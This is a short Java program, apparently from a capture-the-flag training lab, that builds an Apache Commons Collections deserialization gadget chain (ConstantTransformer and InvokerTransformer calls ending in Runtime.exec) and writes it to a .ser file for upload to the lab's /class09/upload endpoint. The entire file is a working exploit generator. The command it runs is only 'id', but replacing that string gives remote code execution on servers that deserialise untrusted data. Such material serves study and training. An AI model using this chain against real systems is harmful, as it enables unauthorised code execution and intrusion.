package class09;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import com.ctfstu.common.Logger;

/**
 * 生成 class09 的 payload — ChainedTransformer
 * 目标: 上传 ChainedTransformer，靶场调用 t.transform(null) 触发整条链
 * 靶场: /class09/upload
 *
 * 链:  ConstantTransformer(Runtime.class)
 *    → InvokerTransformer(getMethod, getRuntime)
 *    → InvokerTransformer(invoke, null)
 *    → InvokerTransformer(exec, "id")
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        Logger.setLogLevel(Logger.DEBUG);
        Transformer[] chain = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"id"})
        };

        ChainedTransformer ct = new ChainedTransformer(chain);

        ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream("class09.ser"));
        oos.writeObject(ct);
        oos.close();

        System.out.println("✅ 已生成: class09.ser");
    }
}
